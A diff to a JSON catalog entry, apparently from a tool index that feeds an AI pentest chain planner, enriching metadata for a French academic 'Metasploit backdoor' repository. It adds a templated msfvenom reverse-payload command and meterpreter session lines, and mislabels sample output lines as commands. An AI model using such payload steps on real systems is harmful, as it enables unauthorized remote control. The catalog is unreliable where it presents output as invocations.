@@ -8,8 +8,13 @@
   "url": "https://github.com/ngantou/metasploit-backdoor-experiment",
   "summary": "Backdoor expérimental avec Metasploit",
   "documentation": {
-    "readme": "Backdoor expérimental avec Metasploit",
-    "usage_sections": [],
+    "readme": "- Objectif : Démontrer les étapes d’un contrôle d’un système via une backdoor. - Autorisation : Exercice académique strictement encadré et supervisé. - Outils utilisés : - msfvenom (version X.Y) - Metasploit Framework - Machine cible : Ubuntu (architecture x86)",
+    "usage_sections": [
+      "Objectif : Démontrer les étapes d’un contrôle d’un système via une backdoor.",
+      "Autorisation : Exercice académique strictement encadré et supervisé.",
+      "msfvenom (version X.Y)",
+      "Machine cible : Ubuntu (architecture x86)"
+    ],
     "arguments": [
       {
         "name": "--help",
@@ -193,7 +198,14 @@
         "source": "v2_enhancement"
       }
     ],
-    "examples": [],
+    "examples": [
+      "msfvenom -p <OS>/<arch>/<payload_type> LHOST=<IP_LOCALE> LPORT=<PORT> -f <format> -o <fichier_sortie>",
+      "meterpreter > pwd",
+      "meterpreter > sysinfo",
+      "Computer     : metasploitable.localdomain",
+      "OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)",
+      "Meterpreter  : x86/linux"
+    ],
     "file_listing": [
       "README.md"
     ],
@@ -244,13 +256,9 @@
         "score": 1
       }
     ],
-    "when_to_use": "Use this tool when the engagement is in the 'post_exploit' phase against a target with '['shell_windows', 'shell_linux', 'ad']' as the attack surface (post-exploitation, toolbox, github).",
-    "why_to_use": "This tool is preferred because: Index entry in the Post-Exploitation category. Use as a candidate tool in the chain planner after a NVD/lookup pass on the target vendor.",
-    "how_to_use": [
-      "Step 1: cd toolboxes/metasploit-backdoor-experiment && python3 metasploit-backdoor-experiment.py --help",
-      "Step 2: cd toolboxes/metasploit-backdoor-experiment && cat README.md",
-      "Step 3: cd toolboxes/metasploit-backdoor-experiment && ls -la"
-    ]
+    "when_to_use": "Use during the 'post_exploit' phase against surfaces [shell_windows, shell_linux, ad] in the Post-Exploitation category. Fits when the engagement needs: Backdoor expérimental avec Metasploit.",
+    "why_to_use": "Prefer this tool based on upstream description: - Objectif : Démontrer les étapes d’un contrôle d’un système via une backdoor. - Autorisation : Exercice académique strictement encadré et supervisé. - Outils utilisés : - msfvenom (version X.Y) - Metasploit Framework - Machine cible : Ubuntu (architecture x86).",
+    "how_to_use": "Run the primary entrypoint as shown in upstream docs, e.g. `msfvenom -p <OS>/<arch>/<payload_type> LHOST=<IP_LOCALE> LPORT=<PORT> -f <format> -o <fichier_sortie>`. Further invocations from upstream: `meterpreter > pwd`; `meterpreter > sysinfo`."
   },
   "metadata_status": "enriched",
   "trust": {
@@ -281,18 +289,22 @@
     "target-adaptive"
   ],
   "use_cases": [
-    "Index entry in the Post-Exploitation category. Use as a candidate tool in the chain planner after a NVD/lookup pass on the target vendor.",
-    "Pairs with the Post-Exploitation system-prompt stanza in core.ai_backend.chain to teach the LLM the standard invocation pattern.",
-    "Operator-initiated: the chain step is gated by the per-step ACCEPT/CANCEL gate; the tool does not auto-execute.",
-    "Use as a reference implementation when designing a new v3 method for this category.",
-    "Use as a teaching example in the prompt stanza so the LLM can reason about the right run order."
+    "When you need Post-Exploitation, use metasploit-backdoor-experiment because Backdoor expérimental avec Metasploit.",
+    "When the engagement is in the post_exploit phase, use metasploit-backdoor-experiment as a cataloged Post-Exploitation tool with operator ACCEPT/CANCEL gating.",
+    "When you need a concrete invocation, run `msfvenom -p <OS>/<arch>/<payload_type> LHOST=<IP_LOCALE> LPORT=<PORT> -f <format> -o <fichier_sortie>` as documented upstream for metasploit-backdoor-experiment.",
+    "When you need a concrete invocation, run `meterpreter > pwd` as documented upstream for metasploit-backdoor-experiment.",
+    "When you need a concrete invocation, run `meterpreter > sysinfo` as documented upstream for metasploit-backdoor-experiment.",
+    "When you need a concrete invocation, run `Computer     : metasploitable.localdomain` as documented upstream for metasploit-backdoor-experiment.",
+    "When chaining Post-Exploitation tools, pair metasploit-backdoor-experiment with sibling catalog entries sharing its attack_surface/phase_hint.",
+    "When validating lab setup, run `metasploit-backdoor-experiment --help` (or the README entrypoint) and confirm required hardware/deps from the catalog."
   ],
   "command_examples": [
-    "cd toolboxes/metasploit-backdoor-experiment && python3 metasploit-backdoor-experiment.py --help",
-    "cd toolboxes/metasploit-backdoor-experiment && cat README.md",
-    "cd toolboxes/metasploit-backdoor-experiment && ls -la",
-    "cd toolboxes/metasploit-backdoor-experiment && python3 metasploit-backdoor-experiment.py --target $KFIOSA_TARGET_HOST",
-    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST metasploit-backdoor-experiment --output $KFIOSA_OUTPUT_DIR/metasploit-backdoor-experiment.log"
+    "msfvenom -p <OS>/<arch>/<payload_type> LHOST=<IP_LOCALE> LPORT=<PORT> -f <format> -o <fichier_sortie>",
+    "meterpreter > pwd",
+    "meterpreter > sysinfo",
+    "Computer     : metasploitable.localdomain",
+    "OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)",
+    "Meterpreter  : x86/linux"
   ],
   "attack_surface": [
     "shell_windows",
@@ -313,5 +325,7 @@
   ],
   "_kfiosa_enriched_schema": "1.2.0",
   "_kfiosa_enriched_at": "phase4_t16",
-  "_languages": []
+  "_languages": [],
+  "_kfiosa_enhanced_v3": true,
+  "_enhanced_via": "local_readme"
 }
